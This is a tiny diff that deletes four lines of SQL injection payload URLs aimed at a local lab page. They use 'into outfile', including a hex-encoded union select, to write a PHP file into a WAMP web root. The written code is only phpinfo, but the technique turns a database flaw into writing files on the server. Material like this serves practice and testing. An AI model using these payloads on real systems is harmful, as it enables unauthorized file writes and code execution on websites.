@@ -1,4 +1,0 @@
-http://127.0.0.1:81/sqli.php?id=1 into outfile C:\\wamp64\\www\\phpinfo.php' FIELD STERMINATED BY '<?php phpinfo(); ?>'
-http://127.0.0.1:81/sqli.php?id=-1 union select
-1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile
-C:\\wamp64\\www\\phpinfo.php'`
